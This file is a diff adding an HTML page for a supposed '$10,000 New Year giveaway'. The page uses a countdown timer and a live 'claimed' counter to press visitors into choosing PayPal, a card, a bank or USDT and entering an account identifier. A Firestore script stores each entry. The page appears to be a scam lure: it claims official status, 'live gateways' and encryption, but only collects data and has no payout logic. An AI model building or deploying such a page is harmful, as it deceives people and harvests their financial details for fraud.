@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NY 2026 Premium Giveaway</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #020202;
+            color: white;
+            overflow-x: hidden;
+        }
+        .glass-card {
+            background: #0c0c0c;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
+        }
+        .step { display: none; }
+        .step.active { display: block; }
+        .animate-pulse-slow {
+            animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .method-btn {
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .glow-text {
+            text-shadow: 0 0 20px rgba(234, 179, 8, 0.4);
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Elements -->
+    <div class="fixed top-0 left-1/2 -translate-x-1/2 w-full max-w-6xl h-full pointer-events-none overflow-hidden opacity-20">
+        <div class="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-yellow-500/20 rounded-full blur-[120px]"></div>
+        <div class="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-blue-500/10 rounded-full blur-[120px]"></div>
+    </div>
+
+    <!-- Header -->
+    <header class="max-w-5xl mx-auto flex justify-between items-center py-8 px-4 relative z-10">
+        <div class="text-3xl font-black italic tracking-tighter flex items-center gap-2">
+            <span class="bg-white text-black px-2 rounded-lg not-italic">NY</span>
+            <span class="text-yellow-500">2026</span>
+        </div>
+        <div class="bg-white/5 backdrop-blur-md border border-white/10 px-4 py-2 rounded-full flex items-center gap-3 shadow-2xl">
+            <div class="flex -space-x-2">
+                <div class="w-5 h-5 rounded-full bg-neutral-800 border border-white/20"></div>
+                <div class="w-5 h-5 rounded-full bg-neutral-700 border border-white/20"></div>
+                <div class="w-5 h-5 rounded-full bg-neutral-600 border border-white/20"></div>
+            </div>
+            <span class="text-[10px] font-black uppercase tracking-widest text-neutral-400">
+                <span class="text-white" id="counter">0</span> Claimed
+            </span>
+        </div>
+    </header>
+
+    <main class="max-w-4xl mx-auto pt-4 pb-20 px-4 relative z-10">
+        <section class="text-center mb-12">
+            <div class="inline-block bg-yellow-500/10 text-yellow-500 border border-yellow-500/20 px-4 py-1 rounded-full text-[10px] font-black uppercase tracking-[0.2em] mb-6">
+                Official Event Distribution
+            </div>
+            <h1 class="text-6xl md:text-8xl font-black tracking-tighter uppercase italic leading-[0.85] mb-6">
+                NEW YEAR <br/>
+                <span class="text-transparent bg-clip-text bg-gradient-to-b from-white to-neutral-500">FESTIVAL</span>
+            </h1>
+            
+            <!-- GIVEAWAY DECLARATION -->
+            <div class="max-w-lg mx-auto bg-gradient-to-r from-yellow-500/20 via-yellow-500/5 to-yellow-500/20 border-y border-yellow-500/30 py-4 mb-10">
+                <p class="text-yellow-500 font-black italic uppercase tracking-tighter text-xl md:text-2xl glow-text">
+                    $10,000 GIVEAWAY
+                </p>
+                <p class="text-[10px] font-bold text-neutral-400 uppercase tracking-[0.2em] mt-1">
+                    Exclusive to the first <span class="text-white">3,000</span> verified participants
+                </p>
+            </div>
+            
+            <div class="flex justify-center gap-3 md:gap-6 mt-10" id="timer">
+                <div class="flex flex-col items-center">
+                    <div class="bg-white/5 border border-white/10 backdrop-blur-md rounded-2xl md:rounded-3xl w-16 h-16 md:w-24 md:h-24 flex items-center justify-center mb-2 shadow-xl">
+                        <span class="text-2xl md:text-4xl font-black text-white" id="days">00</span>
+                    </div>
+                    <span class="text-[9px] uppercase font-bold text-neutral-500 tracking-widest">Days</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div class="bg-white/5 border border-white/10 backdrop-blur-md rounded-2xl md:rounded-3xl w-16 h-16 md:w-24 md:h-24 flex items-center justify-center mb-2 shadow-xl">
+                        <span class="text-2xl md:text-4xl font-black text-white" id="hours">00</span>
+                    </div>
+                    <span class="text-[9px] uppercase font-bold text-neutral-500 tracking-widest">Hours</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div class="bg-white/5 border border-white/10 backdrop-blur-md rounded-2xl md:rounded-3xl w-16 h-16 md:w-24 md:h-24 flex items-center justify-center mb-2 shadow-xl">
+                        <span class="text-2xl md:text-4xl font-black text-white" id="mins">00</span>
+                    </div>
+                    <span class="text-[9px] uppercase font-bold text-neutral-500 tracking-widest">Mins</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div class="bg-white/5 border border-white/10 backdrop-blur-md rounded-2xl md:rounded-3xl w-16 h-16 md:w-24 md:h-24 flex items-center justify-center mb-2 shadow-xl">
+                        <span class="text-2xl md:text-4xl font-black text-white" id="secs">00</span>
+                    </div>
+                    <span class="text-[9px] uppercase font-bold text-neutral-500 tracking-widest">Secs</span>
+                </div>
+            </div>
+        </section>
+
+        <div class="max-w-2xl mx-auto">
+            <div class="glass-card rounded-[3rem] p-6 md:p-10 relative overflow-hidden" id="main-container">
+                <!-- Step 1: Select Method -->
+                <div id="step-1" class="step active">
+                    <div class="text-center mb-10">
+                        <h2 class="text-2xl font-black tracking-tight mb-2 uppercase italic">Select Payout Vault</h2>
+                        <p class="text-neutral-500 text-sm">Connect your vault to claim your piece of the <span class="text-yellow-500 font-bold">$10k pool</span>.</p>
+                    </div>
+                    
+                    <div class="grid grid-cols-1 gap-4 mb-10">
+                        <!-- PayPal -->
+                        <button onclick="selectMethod('PayPal')" id="btn-PayPal" class="method-btn relative h-24 rounded-[1.5rem] p-4 flex items-center transition-all overflow-hidden bg-neutral-900/50 border border-white/5 hover:bg-neutral-800">
+                            <div class="bg-white p-2 rounded-xl h-14 w-20 flex items-center justify-center mr-6 shadow-2xl shrink-0">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="h-8 w-full object-contain" alt="PayPal">
+                            </div>
+                            <div class="text-left">
+                                <span class="text-lg font-black text-white block leading-none mb-1">PayPal</span>
+                                <div class="flex items-center gap-2">
+                                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                                    <span class="text-[9px] text-neutral-400 font-bold uppercase tracking-widest">Live Gateway</span>
+                                </div>
+                            </div>
+                        </button>
+
+                        <!-- Mastercard -->
+                        <button onclick="selectMethod('Mastercard')" id="btn-Mastercard" class="method-btn relative h-24 rounded-[1.5rem] p-4 flex items-center transition-all overflow-hidden bg-neutral-900/50 border border-white/5 hover:bg-neutral-800">
+                            <div class="bg-white p-2 rounded-xl h-14 w-20 flex items-center justify-center mr-6 shadow-2xl shrink-0">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-10 w-full object-contain" alt="Mastercard">
+                            </div>
+                            <div class="text-left">
+                                <span class="text-lg font-black text-white block leading-none mb-1">Mastercard</span>
+                                <div class="flex items-center gap-2">
+                                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                                    <span class="text-[9px] text-neutral-400 font-bold uppercase tracking-widest">Live Gateway</span>
+                                </div>
+                            </div>
+                        </button>
+
+                        <!-- Visa -->
+                        <button onclick="selectMethod('Visa Card')" id="btn-Visa" class="method-btn relative h-24 rounded-[1.5rem] p-4 flex items-center transition-all overflow-hidden bg-neutral-900/50 border border-white/5 hover:bg-neutral-800">
+                            <div class="bg-white p-2 rounded-xl h-14 w-20 flex items-center justify-center mr-6 shadow-2xl shrink-0">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" class="h-8 w-full object-contain" alt="Visa">
+                            </div>
+                            <div class="text-left">
+                                <span class="text-lg font-black text-white block leading-none mb-1">Visa Card</span>
+                                <div class="flex items-center gap-2">
+                                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                                    <span class="text-[9px] text-neutral-400 font-bold uppercase tracking-widest">Live Gateway</span>
+                                </div>
+                            </div>
+                        </button>
+
+                        <!-- Direct Bank (Modern/Casual Icon) -->
+                        <button onclick="selectMethod('Direct Bank')" id="btn-Bank" class="method-btn relative h-24 rounded-[1.5rem] p-4 flex items-center transition-all overflow-hidden bg-neutral-900/50 border border-white/5 hover:bg-neutral-800">
+                            <div class="bg-white p-2 rounded-xl h-14 w-20 flex items-center justify-center mr-6 shadow-2xl shrink-0">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Icon_Bank.svg" class="h-10 w-full object-contain" alt="Bank">
+                            </div>
+                            <div class="text-left">
+                                <span class="text-lg font-black text-white block leading-none mb-1">Direct Bank</span>
+                                <div class="flex items-center gap-2">
+                                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                                    <span class="text-[9px] text-neutral-400 font-bold uppercase tracking-widest">Live Gateway</span>
+                                </div>
+                            </div>
+                        </button>
+
+                        <!-- USDT -->
+                        <button onclick="selectMethod('USDT (Tether)')" id="btn-USDT" class="method-btn relative h-24 rounded-[1.5rem] p-4 flex items-center transition-all overflow-hidden bg-neutral-900/50 border border-white/5 hover:bg-neutral-800">
+                            <div class="bg-white p-2 rounded-xl h-14 w-20 flex items-center justify-center mr-6 shadow-2xl shrink-0">
+                                <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=040" class="h-10 w-full object-contain" alt="USDT">
+                            </div>
+                            <div class="text-left">
+                                <span class="text-lg font-black text-white block leading-none mb-1">USDT (Tether)</span>
+                                <div class="flex items-center gap-2">
+                                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                                    <span class="text-[9px] text-neutral-400 font-bold uppercase tracking-widest">Live Gateway</span>
+                                </div>
+                            </div>
+                        </button>
+                    </div>
+                    
+                    <button onclick="goToStep(2)" id="continue-btn" disabled class="w-full py-6 bg-white text-black rounded-3xl font-black uppercase tracking-[0.2em] text-xs disabled:opacity-20 transition-all hover:bg-yellow-500 shadow-2xl shadow-white/5">
+                        Establish Connection
+                    </button>
+                </div>
+
+                <!-- Step 2: Credentials -->
+                <div id="step-2" class="step">
+                    <div class="text-center mb-10">
+                        <h2 class="text-2xl font-black tracking-tight mb-2 uppercase italic">Vault Credentials</h2>
+                        <p class="text-neutral-500 text-sm">Synchronize your <span id="display-method" class="text-yellow-500"></span> identification.</p>
+                    </div>
+                    <div class="mb-10">
+                        <label class="text-[10px] font-black text-neutral-500 uppercase ml-2 block mb-3 tracking-[0.2em]">Identification ID</label>
+                        <input type="text" id="account-id" oninput="validateInput()" placeholder="Enter identifier" class="w-full bg-neutral-900/50 border border-white/5 p-6 rounded-[2rem] focus:outline-none focus:border-yellow-500/50 text-xl font-bold transition-all placeholder:text-neutral-700">
+                    </div>
+                    <button onclick="goToStep(3)" id="verify-btn" disabled class="w-full py-6 bg-yellow-500 text-black rounded-3xl font-black uppercase tracking-[0.2em] text-xs shadow-xl shadow-yellow-500/20 active:scale-95 transition-transform">Verify Account</button>
+                    <button onclick="goToStep(1)" class="mt-6 text-[10px] font-black text-neutral-600 hover:text-white transition tracking-widest uppercase block mx-auto underline decoration-neutral-800 underline-offset-8">Return</button>
+                </div>
+
+                <!-- Step 3: Summary -->
+                <div id="step-3" class="step">
+                    <div class="bg-neutral-900/50 border border-white/5 p-8 rounded-[2.5rem] mb-10 text-left relative">
+                        <h4 class="text-yellow-500 font-black text-[10px] uppercase tracking-[0.3em] mb-8 border-b border-white/5 pb-4">Verification Summary</h4>
+                        <div class="space-y-5">
+                            <div class="flex justify-between items-center">
+                                <span class="text-[11px] font-bold text-neutral-500 uppercase tracking-widest">Pool Eligibility</span>
+                                <span class="font-black text-white text-xl">Top 3,000 Tier</span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-[11px] font-bold text-neutral-500 uppercase tracking-widest">Base Share</span>
+                                <span class="font-black text-white text-xl">$3.33</span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-[11px] font-bold text-neutral-500 uppercase tracking-widest">Selected Vault</span>
+                                <span class="font-black text-white" id="summary-method"></span>
+                            </div>
+                            <div class="flex flex-col gap-2 pt-4 border-t border-white/5">
+                                <span class="text-[11px] font-bold text-neutral-500 uppercase tracking-widest">Payment Destination</span>
+                                <span class="font-black text-yellow-500 break-all text-sm leading-relaxed" id="summary-id"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="submitVault()" id="submit-btn" class="w-full py-6 bg-white text-black rounded-3xl font-black uppercase tracking-[0.2em] text-xs shadow-2xl active:scale-95 transition-transform">
+                        Secure My Share
+                    </button>
+                </div>
+
+                <!-- Step 4: Success -->
+                <div id="step-4" class="step text-center py-12">
+                    <div class="w-24 h-24 bg-green-500/10 border-2 border-green-500 text-green-500 rounded-full flex items-center justify-center mx-auto mb-10 shadow-[0_0_60px_rgba(34,197,94,0.15)]">
+                        <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="4"><path d="M5 13l4 4L19 7"/></svg>
+                    </div>
+                    <h2 class="text-4xl font-black mb-4 italic tracking-tighter uppercase leading-none">RESERVATION <br/><span class="text-yellow-500">SECURED</span></h2>
+                    <p class="text-neutral-400 mb-10 max-w-sm mx-auto font-medium text-sm leading-relaxed text-center">Your NY 2026 information is officially locked. You have been prioritized for the <span class="text-white font-bold">$10,000 pool</span> distribution.</p>
+                    <div class="px-8 py-3 bg-white/5 border border-white/10 rounded-full inline-block text-[10px] font-black uppercase text-yellow-500 tracking-[0.3em] animate-pulse-slow">
+                        Status: Pending Distribution
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="max-w-4xl mx-auto border-t border-white/5 mt-10 pt-10 pb-20 text-center text-neutral-700 text-[10px] font-black uppercase tracking-[0.4em]">
+        NY 2026 GLOBAL DISTRIBUTION PROTOCOL • SECURE VAULT ENCRYPTION • VERIFIED 1:1
+    </footer>
+
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, doc, setDoc, getDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Global State
+        const firebaseConfig = JSON.parse(__firebase_config);
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'ny-2026-v1';
+        
+        let currentUser = null;
+        let selectedMethod = '';
+
+        // Timer Function
+        function updateTimer() {
+            const target = new Date('December 31, 2025 23:59:59').getTime();
+            const now = new Date().getTime();
+            const distance = target - now;
+            if (distance < 0) return;
+            document.getElementById('days').innerText = String(Math.floor(distance / (1000 * 60 * 60 * 24))).padStart(2, '0');
+            document.getElementById('hours').innerText = String(Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60))).padStart(2, '0');
+            document.getElementById('mins').innerText = String(Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, '0');
+            document.getElementById('secs').innerText = String(Math.floor((distance % (1000 * 60)) / 1000)).padStart(2, '0');
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        async function init() {
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (err) { console.error("Auth failed", err); }
+
+            onAuthStateChanged(auth, async (user) => {
+                if (!user) return;
+                currentUser = user;
+
+                const publicDataRef = collection(db, 'artifacts', appId, 'public', 'data', 'submissions');
+                onSnapshot(publicDataRef, (snapshot) => {
+                    const count = snapshot.size;
+                    document.getElementById('counter').innerText = count.toLocaleString();
+                }, (error) => console.error("Counter Error:", error));
+
+                const userDocRef = doc(db, 'artifacts', appId, 'users', user.uid, 'submissions', 'entry');
+                const userDoc = await getDoc(userDocRef);
+                if (userDoc.exists()) {
+                    goToStep(4);
+                }
+            });
+        }
+
+        window.selectMethod = (method) => {
+            selectedMethod = method;
+            document.querySelectorAll('.method-btn').forEach(btn => {
+                btn.classList.remove('ring-2', 'ring-yellow-500', 'scale-[1.02]', 'bg-neutral-800');
+                btn.classList.add('opacity-40');
+            });
+            const key = method.split(' ')[0];
+            const activeBtn = document.getElementById('btn-' + key);
+            if(activeBtn) {
+                activeBtn.classList.add('ring-2', 'ring-yellow-500', 'scale-[1.02]', 'bg-neutral-800');
+                activeBtn.classList.remove('opacity-40');
+            }
+            document.getElementById('continue-btn').disabled = false;
+        };
+
+        window.goToStep = (num) => {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step-' + num).classList.add('active');
+            if(num === 2) document.getElementById('display-method').innerText = selectedMethod;
+            if(num === 3) {
+                document.getElementById('summary-method').innerText = selectedMethod;
+                document.getElementById('summary-id').innerText = document.getElementById('account-id').value;
+            }
+        };
+
+        window.validateInput = () => {
+            const val = document.getElementById('account-id').value;
+            document.getElementById('verify-btn').disabled = val.length < 5;
+        };
+
+        window.submitVault = async () => {
+            if (!currentUser) return;
+            const btn = document.getElementById('submit-btn');
+            const accountId = document.getElementById('account-id').value;
+            
+            btn.innerText = "Encrypting & Locking...";
+            btn.disabled = true;
+
+            try {
+                const privateRef = doc(db, 'artifacts', appId, 'users', currentUser.uid, 'submissions', 'entry');
+                await setDoc(privateRef, {
+                    method: selectedMethod,
+                    accountId: accountId,
+                    poolTier: "Top 3000",
+                    timestamp: new Date().toISOString()
+                });
+
+                const publicRef = doc(db, 'artifacts', appId, 'public', 'data', 'submissions', currentUser.uid);
+                await setDoc(publicRef, { verified: true });
+
+                goToStep(4);
+            } catch (e) {
+                btn.innerText = "Error - Try Again";
+                btn.disabled = false;
+                console.error(e);
+            }
+        };
+
+        init();
+    </script>
+</body>
+</html>
